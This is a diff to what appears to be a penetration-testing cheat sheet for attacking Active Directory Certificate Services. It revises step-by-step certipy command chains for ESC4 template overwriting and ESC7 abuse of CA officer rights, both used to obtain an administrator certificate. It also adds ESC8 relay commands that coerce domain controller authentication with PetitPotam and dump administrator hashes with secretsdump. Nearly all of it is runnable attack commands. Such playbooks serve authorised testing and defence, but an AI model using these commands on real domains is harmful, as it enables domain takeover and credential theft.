@@ -102,11 +102,13 @@ certipy auth -pfx administrator.pfx -dc-ip $DC_IP
 Overwrite the template's attributes to introduce ESC1 conditions, exploit it, then restore the original config.
 
 ```bash wrap
-# Overwrite template to be ESC1-vulnerable
+# Overwrite template to default vulnerable configuration (saves backup JSON automatically)
 certipy template -u $USER@$DOMAIN -p $PASSWORD \
-  -template $TEMPLATE -save-old
+  -dc-ip $DC_IP \
+  -template $TEMPLATE \
+  -write-default-configuration
 
-# Then exploit as ESC1
+# Exploit as ESC1
 certipy req -u $USER@$DOMAIN -p $PASSWORD \
   -dc-ip $DC_IP \
   -target $CA_HOST \
@@ -114,9 +116,13 @@ certipy req -u $USER@$DOMAIN -p $PASSWORD \
   -template $TEMPLATE \
   -upn administrator@$DOMAIN
 
-# Restore original template after
+certipy auth -pfx administrator.pfx -dc-ip $DC_IP
+
+# Restore original template from the backup JSON
 certipy template -u $USER@$DOMAIN -p $PASSWORD \
-  -template $TEMPLATE -configuration <old-config>
+  -dc-ip $DC_IP \
+  -template $TEMPLATE \
+  -write-configuration $TEMPLATE.json
 ```
 
 ## ESC5: Vulnerable PKI Object Access Control
@@ -162,24 +168,46 @@ certipy req -u $USER@$DOMAIN -p $PASSWORD \
 **Conditions:**
 - You have `ManageCA` or `ManageCertificates` rights on the CA
 
-ManageCA lets you enable the EDITF flag (turning it into ESC6), while ManageCertificates lets you approve pending failed requests.
+With ManageCA you can enable the SubCA template and grant yourself the Certificate Officer role. Certificate Officer lets you issue any pending or failed request, including ones that require manager approval.
 
 ```bash wrap
-# With ManageCA: enable EDITF_ATTRIBUTESUBJECTALTNAME2
+# Step 1: Enable the SubCA template on the CA
 certipy ca -u $USER@$DOMAIN -p $PASSWORD \
   -dc-ip $DC_IP \
   -target $CA_HOST \
   -ca $CA \
-  -enable-editf
+  -enable-template SubCA
 
-# Then exploit as ESC6
-
-# With ManageCertificates: approve failed requests
+# Step 2: Add yourself as Certificate Officer (ManageCertificates)
 certipy ca -u $USER@$DOMAIN -p $PASSWORD \
   -dc-ip $DC_IP \
   -target $CA_HOST \
   -ca $CA \
-  -issue-request <request-id>
+  -add-officer $USER
+
+# Step 3: Request a cert using SubCA template (will be denied, note the request ID)
+certipy req -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP \
+  -target $CA_HOST \
+  -ca $CA \
+  -template SubCA \
+  -upn administrator@$DOMAIN
+
+# Step 4: Issue the pending/denied request
+certipy ca -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP \
+  -target $CA_HOST \
+  -ca $CA \
+  -issue-request $REQUEST_ID
+
+# Step 5: Retrieve the issued certificate
+certipy req -u $USER@$DOMAIN -p $PASSWORD \
+  -dc-ip $DC_IP \
+  -target $CA_HOST \
+  -ca $CA \
+  -retrieve $REQUEST_ID
+
+certipy auth -pfx administrator.pfx -dc-ip $DC_IP
 ```
 
 ## ESC8: Relay to AD CS HTTP
@@ -193,16 +221,23 @@ AD CS HTTP enrolment (`/certsrv/certfnsh.asp`) can be abused via both NTLM and K
 - SMB signing disabled on the coerced host
 
 ```bash wrap
-# Start relay
+# Start certipy relay
+certipy relay -target http://$CA_HOST -template DomainController
+
+# Coerce DC authentication (any primitive works)
+nxc smb $DC_IP -M coerce_plus -o LISTENER=$LHOST
+python3 PetitPotam.py -u $USER -p $PASSWORD -d $DOMAIN $LHOST $DC_IP
+
+# Authenticate with the obtained cert
+certipy auth -pfx domain-controller.pfx -dc-ip $DC_IP
+secretsdump.py -just-dc-user administrator -hashes :$NT_HASH $DOMAIN/$DC_NAME\$@$DC_IP
+```
+
+Alternatively with `ntlmrelayx.py`:
+
+```bash wrap
 ntlmrelayx.py -t http://$CA_HOST/certsrv/certfnsh.asp \
   -smb2support --adcs --template DomainController
-
-# Coerce DC authentication
-printerbug.py $DOMAIN/$USER:$PASSWORD@$DC_HOST $LHOST
-PetitPotam.py $LHOST $DC_HOST
-
-# Authenticate with obtained cert
-certipy auth -pfx dc.pfx -dc-ip $DC_IP
 ```
 
 ### Kerberos Relay (krbrelayx)
